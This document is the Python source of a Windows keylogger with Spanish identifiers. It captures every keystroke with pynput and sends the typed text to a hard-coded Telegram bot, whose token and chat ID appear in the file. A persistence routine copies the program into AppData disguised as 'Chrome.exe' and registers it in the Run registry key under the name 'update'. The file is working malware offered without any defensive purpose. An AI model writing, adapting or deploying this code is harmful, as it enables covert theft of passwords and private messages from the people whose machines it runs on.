#!/usr/bin/env python
#_*_ coding: utf8 _*_ 
import pynput.keyboard
import shutil
import os
import subprocess
import sys
import requests

lista_tecla = []
def persintencia():
    evil_file_location = os.environ["appdata"] + "\\Chrome.exe" 
    if not os.path.exists(evil_file_location):
        shutil.copyfile(sys.executable,evil_file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
    
    if os.path.exists(evil_file_location):
        if os.getcwd() == "C:\WINDOWS\system32":           
            pass
        else:
            raise SystemExit(1)
            

def send(bot_message):
    
    bot_token = '1417980393:AAFbbbSzn-PcvUF6aij3Q9yTBExyhjNX89Y'
    bot_chatID = '1248561056'
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
    requests.get(send_text)
    lista_tecla.clear()

def presiona(key):
    
    key1 = convertir(key)
    if key1 == "Key.esc":          
        pass
    elif key1 == "Key.space":                  
        lista_tecla.append(" ")               
    elif key1 == "Key.enter":               
        lista_tecla.append('\n')
        Llenando_lista()                           # salto de linea
    elif key1 == "Key.backspace":             # Tecla retroceso
        pass                                   
    elif key1 == "Key.ctrl_l":
        pass  
    elif key1 == "Key.left":
        pass
    elif key1 == "Key.right":
        pass
    elif key1 == "Key.alt_l":
        pass
    elif key1 == "Key.tab":                   
        pass                                
    elif key1 == "Key.shift":                
        pass 
    elif key1 == "Key.caps_lock":              
        pass   
    else:
        if key1 == None:
           pass
        else:
            lista_tecla.append(key1)            
    
def Llenando_lista():        
    teclas =''.join(lista_tecla)
    try:
        send(teclas)
    except:
        pass
 
def convertir(key):

    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)  

#persintencia()
with pynput.keyboard.Listener(on_press=presiona) as listen:
    listen.join()


    
